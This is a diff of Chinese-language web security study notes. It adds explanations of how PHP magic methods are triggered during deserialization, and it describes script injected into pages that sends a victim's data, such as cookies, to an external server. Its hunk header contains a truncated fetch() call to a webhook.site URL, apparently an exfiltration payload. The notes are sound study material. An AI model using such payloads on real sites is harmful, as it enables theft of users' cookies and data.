@@ -80,7 +80,7 @@ fetch("https://webhook.site/699a6563-c9b5-4ad7-adaa-e189c5f78194", { method: 'GE
 |語言|序列化|反序列化|Magic Method|
 |---|---|---|---|
 |Python|pickle.dumps()|pickle.loads()|`__reduce`|
-|PHP|serialize||unserialize|`__destruct()`<br>`__wakeup()`<br>`__call()`<br>`__toString()`<br>
+|PHP|serialize||unserialize|`__destruct()`: Object被銷毀或garbage collection會觸發<br>`__wakeup()`: unserialize時自動觸發<br>`__call()`: 如果被呼叫一個不存在的方法就會嘗試呼叫，`$obj->note_exist();`<br>`__toString()`: 在被當成String處理時呼叫，`echo $obj;`<br>
 
 ### Frontend
 攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客，可能是利用[beeceptor](https://beeceptor.com/)這樣的外部server(這是其中一種受害方式，也可能很直接的被盜取`COOKIE`之類的)
